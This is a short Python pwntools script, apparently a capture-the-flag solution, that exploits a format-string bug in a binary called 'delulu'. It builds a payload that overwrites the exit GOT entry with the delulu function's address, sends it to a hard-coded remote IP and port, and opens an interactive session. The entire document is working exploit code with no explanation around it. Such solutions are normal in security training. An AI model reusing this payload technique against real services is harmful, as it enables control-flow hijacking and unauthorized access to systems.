from pwn import *

elf = ELF('./delulu')
context.arch = 'amd64'

p = process(elf.path)
p = remote('83.136.250.36',56520 )
p.recvuntil(b'>>')

payload = fmtstr_payload(8, {elf.got.exit: elf.sym.delulu}, numbwritten=0); print(payload)
p.sendline(payload)
p.interactive()
